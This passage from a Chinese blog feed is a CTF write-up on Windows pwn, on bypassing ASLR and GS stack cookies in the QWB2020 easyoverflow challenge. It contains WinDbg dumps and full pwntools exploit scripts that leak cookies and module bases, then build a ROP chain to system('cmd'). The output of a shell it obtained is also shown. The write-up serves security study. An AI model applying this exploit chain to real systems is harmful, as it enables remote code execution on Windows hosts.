class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dec     ebx</span><br><span class="line">call    memset</span><br><span class="line">lea     rcx, Buffer     ; "input:"</span><br><span class="line">call    cs:puts</span><br><span class="line">mov     r8d, 400h       ; MaxCharCount</span><br><span class="line">lea     rdx, [rsp+138h+DstBuf] ; DstBuf</span><br><span class="line">xor     ecx, ecx        ; FileHandle</span><br><span class="line">call    cs:_read</span><br><span class="line">lea     rcx, aBuffer    ; "buffer:"</span><br><span class="line">call    cs:puts</span><br><span class="line">lea     rcx, [rsp+138h+DstBuf] ; Buffer</span><br><span class="line">call    cs:puts</span><br><span class="line">test    ebx, ebx</span><br><span class="line">jg      short loc_7FF60C4C1060</span><br></pre></td></tr></tbody></table></figure><p>通过rbx来控制循环次数，所以控制了rbx为1之后就可以继续执行rop，找到gadgets之后就需要构造rop了，在构造rop的时候会发现失败，排查下来可以发现是rsp的原因</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r</span><br><span class="line">rax=<span class="number">0000000000000140</span> rbx=<span class="number">0000000000000000</span> rcx=<span class="number">00000000f</span>fffffff</span><br><span class="line">rdx=<span class="number">00000245250</span>cc230 rsi=<span class="number">0000000000000000</span> rdi=<span class="number">00000245250</span>d0020</span><br><span class="line">rip=<span class="number">00007f</span>f678e11094 rsp=<span class="number">000000f</span>986aff928 rbp=<span class="number">0000000000000000</span></span><br><span class="line"> r8=<span class="number">0000000000000140</span>  r9=<span class="number">00007f</span>ff2b7909a0 r10=<span class="number">0000000000000000</span></span><br><span class="line">r11=<span class="number">000000000000019</span>c r12=<span class="number">0000000000000000</span> r13=<span class="number">0000000000000000</span></span><br><span class="line">r14=<span class="number">0000000000000000</span> r15=<span class="number">0000000000000000</span></span><br><span class="line">iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</span><br><span class="line">cs=<span class="number">0033</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00000202</span></span><br><span class="line">StackOverflow+<span class="number">0x1094</span>:</span><br><span class="line"><span class="number">00007f</span>f6`<span class="number">78e11094</span> <span class="number">488</span>d0dbd110000  lea     rcx,[StackOverflow+<span class="number">0x2258</span> (<span class="number">00007f</span>f6`<span class="number">78e12258</span>)]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">StackOverflow+<span class="number">0x1094</span>:</span><br><span class="line"><span class="number">00007f</span>f6`<span class="number">78e11094</span> <span class="number">488</span>d0dbd110000  lea     rcx,[StackOverflow+<span class="number">0x2258</span> (<span class="number">00007f</span>f6`<span class="number">78e12258</span>)]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r</span><br><span class="line">rax=<span class="number">0000000000000140</span> rbx=<span class="number">0000000000000000</span> rcx=<span class="number">00000000f</span>fffffff</span><br><span class="line">rdx=<span class="number">00000245250</span>cc230 rsi=<span class="number">0000000000000000</span> rdi=<span class="number">00000245250</span>d0020</span><br><span class="line">rip=<span class="number">00007f</span>f678e11094 rsp=<span class="number">000000f</span>986affa88 rbp=<span class="number">0000000000000000</span></span><br><span class="line"> r8=<span class="number">0000000000000140</span>  r9=<span class="number">00007f</span>ff2b7909a0 r10=<span class="number">0000000000000000</span></span><br><span class="line">r11=<span class="number">000000000000019</span>c r12=<span class="number">0000000000000000</span> r13=<span class="number">0000000000000000</span></span><br><span class="line">r14=<span class="number">0000000000000000</span> r15=<span class="number">0000000000000000</span></span><br></pre></td></tr></tbody></table></figure><p>因为rsp的值改变了，所以最后<code>check cookie</code>会不通过，所以需要重新计算<code>StackCookie</code>，也就是泄露出<code>security_cookie</code>，再计算出新的rsp（<code>000000f986affa88 - 000000f986aff928 = 0x160 </code>），所以exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = <span class="number">0x0000000000096065</span> + ntdll_base</span><br><span class="line">pop_rbx_ret = <span class="number">0x00000000000012a7</span> + ntdll_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000000f12ab</span> + ntdll_base</span><br><span class="line">puts_plt = <span class="number">0x10A6</span> + binary_base</span><br><span class="line">security_cookie_addr = <span class="number">0x3008</span> + binary_base</span><br><span class="line"></span><br><span class="line">p5 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p5 += p64(StackCookie)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p5 += p64(pop_rcx_ret)</span><br><span class="line">p5 += p64(security_cookie_addr)</span><br><span class="line">p5 += p64(pop_rbx_ret)</span><br><span class="line">p5 += p64(<span class="number">1</span>)</span><br><span class="line">p5 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p5)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">security_cookie = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'security_cookie = '</span> + <span class="built_in">hex</span>(security_cookie))</span><br><span class="line"></span><br><span class="line">old_rsp = security_cookie ^ StackCookie</span><br><span class="line">li(<span class="string">'old_rsp = '</span> + <span class="built_in">hex</span>(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x160</span></span><br><span class="line">li(<span class="string">'new_rsp = '</span> + <span class="built_in">hex</span>(new_rsp))</span><br></pre></td></tr></tbody></table></figure><p>现在有了新的rsp，通过<code>security_cookie</code>异或出新的<code>StackCookie</code>即可正常rop，此时输出<code>ucrtbase</code>，然后算出system和cmd，值得注意的是再次rop，rsp还是会变的，算好偏移即可，最终exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = <span class="number">0x0000000000096065</span> + ntdll_base</span><br><span class="line">pop_rbx_ret = <span class="number">0x00000000000012a7</span> + ntdll_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000000f12ab</span> + ntdll_base</span><br><span class="line">puts_plt = <span class="number">0x10A6</span> + binary_base</span><br><span class="line">security_cookie_addr = <span class="number">0x3008</span> + binary_base</span><br><span class="line"></span><br><span class="line">p5 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p5 += p64(StackCookie)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p5 += p64(pop_rcx_ret)</span><br><span class="line">p5 += p64(security_cookie_addr)</span><br><span class="line">p5 += p64(pop_rbx_ret)</span><br><span class="line">p5 += p64(<span class="number">1</span>)</span><br><span class="line">p5 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p5)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">security_cookie = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'security_cookie = '</span> + <span class="built_in">hex</span>(security_cookie))</span><br><span class="line"></span><br><span class="line">old_rsp = security_cookie ^ StackCookie</span><br><span class="line">li(<span class="string">'old_rsp = '</span> + <span class="built_in">hex</span>(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x160</span></span><br><span class="line">li(<span class="string">'new_rsp = '</span> + <span class="built_in">hex</span>(new_rsp))</span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x2178</span> + binary_base</span><br><span class="line"></span><br><span class="line">p6 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p6 += p64(new_rsp ^ security_cookie)</span><br><span class="line">p6 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p6 += p64(pop_rcx_ret) + p64(read_got)</span><br><span class="line">p6 += p64(pop_rbx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">p6 += p64(puts_plt)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p6)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">ucrt_base = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x7650</span></span><br><span class="line">li(<span class="string">'ucrt_base = '</span> + <span class="built_in">hex</span>(ucrt_base))</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xBCB20</span> + ucrt_base</span><br><span class="line">cmd = <span class="number">0xE0020</span> + ucrt_base</span><br><span class="line"></span><br><span class="line">p7 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p7 += p64((new_rsp + <span class="number">0x160</span>) ^ security_cookie)</span><br><span class="line">p7 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p7 += p64(pop_rcx_ret) + p64(cmd)</span><br><span class="line">p7 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p7)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>看一下打通的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    b<span class="number">'b</span>uffer<span class="number">'</span></span><br><span class="line">buffer[DEBUG] Received <span class="number">0x17d</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │:··a│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000100</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">8</span>a  d2 <span class="number">4f</span> <span class="number">29</span> c5  <span class="number">43</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">4</span>d  <span class="number">69</span> <span class="number">63</span> <span class="number">72</span> <span class="number">6f</span>  │aaa·│·O)·│C··M│icro│</span><br><span class="line">    <span class="number">00000110</span>  <span class="number">73</span> <span class="number">6f</span> <span class="number">66</span> <span class="number">74</span>  <span class="number">20</span> <span class="number">57</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">64</span> <span class="number">6f</span> <span class="number">77</span> <span class="number">73</span>  <span class="number">20</span> <span class="number">5b</span> b0 e6  │soft│ Win│dows│ [··│</span><br><span class="line">    <span class="number">00000120</span>  b1 be <span class="number">20</span> <span class="number">31</span>  <span class="number">30</span> <span class="number">2</span>e <span class="number">30</span> <span class="number">2</span>e  <span class="number">32</span> <span class="number">32</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">2</span>e <span class="number">39</span> <span class="number">37</span>  │·· <span class="number">1</span>│<span class="number">0.0</span>.│<span class="number">2200</span>│<span class="number">0.97</span>│</span><br><span class="line">    <span class="number">00000130</span>  <span class="number">38</span> <span class="number">5</span>d <span class="number">0</span>d <span class="number">0</span>a  <span class="number">28</span> <span class="number">63</span> <span class="number">29</span> <span class="number">20</span>  <span class="number">4</span>d <span class="number">69</span> <span class="number">63</span> <span class="number">72</span>  <span class="number">6f</span> <span class="number">73</span> <span class="number">6f</span> <span class="number">66</span>  │<span class="number">8</span>]··│(c) │Micr│osof│</span><br><span class="line">    <span class="number">00000140</span>  <span class="number">74</span> <span class="number">20</span> <span class="number">43</span> <span class="number">6f</span>  <span class="number">72</span> <span class="number">70</span> <span class="number">6f</span> <span class="number">72</span>  <span class="number">61</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6f</span>  <span class="number">6</span>e a1 a3 b1  │t Co│rpor│atio│n···│</span><br><span class="line">    <span class="number">00000150</span>  a3 c1 f4 cb  f9 d3 d0 c8  a8 c0 fb a1  a3 <span class="number">0</span>d <span class="number">0</span>a <span class="number">0</span>d  │····│····│····│····│</span><br><span class="line">    <span class="number">00000160</span>  <span class="number">0</span>a <span class="number">43</span> <span class="number">3</span>a <span class="number">5</span>c  <span class="number">55</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span>  <span class="number">73</span> <span class="number">5</span>c <span class="number">4</span>c <span class="number">65</span>  <span class="number">6</span>e <span class="number">6f</span> <span class="number">76</span> <span class="number">6f</span>  │·C:\│User│s\Le│novo│</span><br><span class="line">    <span class="number">00000170</span>  <span class="number">5</span>c <span class="number">44</span> <span class="number">65</span> <span class="number">73</span>  <span class="number">6b</span> <span class="number">74</span> <span class="number">6f</span> <span class="number">70</span>  <span class="number">5</span>c <span class="number">70</span> <span class="number">77</span> <span class="number">6</span>e  <span class="number">3</span>e           │\Des│ktop│\pwn│&gt;│</span><br><span class="line">    <span class="number">0000017</span>d</span><br><span class="line">:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��O)�C</span><br><span class="line">Microsoft Windows [�汾 <span class="number">10.0</span><span class="number">.22000</span><span class="number">.978</span>]</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\Lenovo\Desktop\pwn&gt;</span><br></pre></td></tr></tbody></table></figure><p>一次不通可以多打几次</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也是学到了如何绕过GS，因为pwntools的模块没有像libc.sym的这样的东西，所以在写exp的时候没有自动化的一个获取，后面笔者有时间的话会寻找一下有没有对应的解决方案</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.zhihu.com/question/434317266/answer/1623308852">https://www.zhihu.com/question/434317266/answer/1623308852</a></p><p><a href="https://ret2ver.github.io/2021/10/02/2020%E5%BC%BA%E7%BD%91%E6%9D%AF-easyoverflow/">https://ret2ver.github.io/2021/10/02/2020%E5%BC%BA%E7%BD%91%E6%9D%AF-easyoverflow/</a></p><p><a href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote&gt;
&lt;p&gt;文章首发于&lt;a href=&quot;https://xz.aliyun.com/t/11913&quot;&gt;先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS&lt;/</summary>
      
    
    
    
    <category term="study" scheme="https://www.z1r0.top/categories/study/"/>
    
    
    <category term="win pwn" scheme="https://www.z1r0.top/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>win pwn初探（二）</title>
    <link href="https://www.z1r0.top/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://www.z1r0.top/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-11-30T00:36:06.000Z</published>
    <updated>2022-12-02T11:45:04.427Z</updated>
    
